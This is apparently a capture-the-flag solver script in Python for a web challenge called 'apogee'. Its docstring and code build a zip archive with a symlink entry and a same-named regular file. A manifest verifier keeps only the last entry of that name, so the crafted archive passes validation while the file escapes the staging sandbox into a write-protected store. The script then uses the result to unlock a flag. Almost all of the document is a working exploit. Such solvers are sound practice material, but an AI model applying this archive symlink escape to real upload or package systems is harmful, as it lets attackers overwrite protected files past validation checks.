#!/usr/bin/env python3
"""apogee (CSCTF 2026, Web, hard) - reproducible solver.

Bug chain (same one Greywater used in journal entry PKG-1354):
  1. The manifest verifier resolves each member path to ONE archive entry by name.
     With two central-directory entries sharing a name, the lookup keeps the LAST one.
  2. extract-zip 2.0.1 extracts EVERY entry, in order, and honours unix mode bits:
     an entry with S_IFLNK|0777 becomes a real symlink.
  3. So: entry A = symlink tables/r3-manoeuvre.ctab -> ../../../trusted/gpc/r3-manoeuvre.ctab
          entry B = regular file with the SAME name, holding the payload.
     A is created first, then B is written through it, landing in the write-protected
     trusted store outside the staging sandbox. The manifest only ever declares B,
     so validation passes with honest hashes - no path contains '..'.

We replay it from the analyst route to put the validated revision-54 table back,
then unlock the uplink pass receipt.

usage: solve.py http://<host>:<port>
"""
import hashlib, io, json, sys, zipfile
import urllib.request, urllib.parse

TARGET = "tables/r3-manoeuvre.ctab"
LINK = b"../../../trusted/gpc/r3-manoeuvre.ctab"
PKG_ID = "PKG-RESTORE54"
sha = lambda b: hashlib.sha256(b).hexdigest()


def get(url):
    with urllib.request.urlopen(url, timeout=30) as r:
        return r.read()


def build(validated):
    readme = b"Analyst re-submission: restore validated revision 54 manoeuvre table.\n"
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)

    def add(name, data, symlink=False):
        zi = zipfile.ZipInfo(name, date_time=(2026, 11, 6, 12, 0, 0))
        zi.create_system = 3                                  # unix
        zi.compress_type = zipfile.ZIP_DEFLATED
        zi.external_attr = (0xA1FF << 16) if symlink else (0o100644 << 16)
        z.writestr(zi, data)

    add("docs/README.txt", readme)
    add(TARGET, LINK, symlink=True)   # extracted first -> creates the escape symlink
    add(TARGET, validated)            # same name -> written through the symlink
    z.close()
    manifest = {
        "package_id": PKG_ID,
        "spacecraft": "ORRIN-3",
        "table": "r3-manoeuvre.ctab",
        "vendor": "NSOC Flight Dynamics",
        "created": "2026-11-06T14:00:00Z",
        "members": [
            {"path": "docs/README.txt", "size": len(readme), "sha256": sha(readme), "type": "file"},
            # the verifier resolves this name to the LAST entry, so declare that one
            {"path": TARGET, "size": len(validated), "sha256": sha(validated), "type": "file"},
        ],
    }
    return json.dumps(manifest).encode(), buf.getvalue()


def post_multipart(url, manifest, package):
    b = "----apogee"
    body = b"".join([
        f'--{b}\r\nContent-Disposition: form-data; name="manifest"; filename="manifest.json"\r\n'
        f'Content-Type: application/json\r\n\r\n'.encode(), manifest, b"\r\n",
        f'--{b}\r\nContent-Disposition: form-data; name="package"; filename="package.zip"\r\n'
        f'Content-Type: application/zip\r\n\r\n'.encode(), package, b"\r\n",
        f"--{b}--\r\n".encode(),
    ])
    req = urllib.request.Request(url, data=body, method="POST",
                                 headers={"Content-Type": f"multipart/form-data; boundary={b}"})
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())


def main(base):
    base = base.rstrip("/")
    validated = get(base + "/reference/validated")
    print(f"[*] validated table: {len(validated)} bytes, sha256 {sha(validated)}")

    manifest, package = build(validated)
    res = post_multipart(base + "/api/v1/submissions", manifest, package)
    print("[*] submission verdict:", res["validation"]["status"],
          "| extracted:", res["extraction"]["entry_names"])
    assert res["ok"], res
    link = res["extraction"]["links"][TARGET]
    print("[*] escaped to:", link["resolved"], "->", link["sha256"])

    ctx = json.loads(get(base + "/api/v1/pass/receipt"))["unlock_context"]
    unlock = sha("apogee|{spacecraft}|{validated_sha256}|{restore_package_id}".format(**ctx).encode())
    receipt = json.loads(get(base + "/api/v1/pass/receipt?unlock=" + unlock))
    assert receipt["status"] == "verified", receipt
    print("FLAG:", receipt["release_token"])


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else open("work/URL").read().strip())
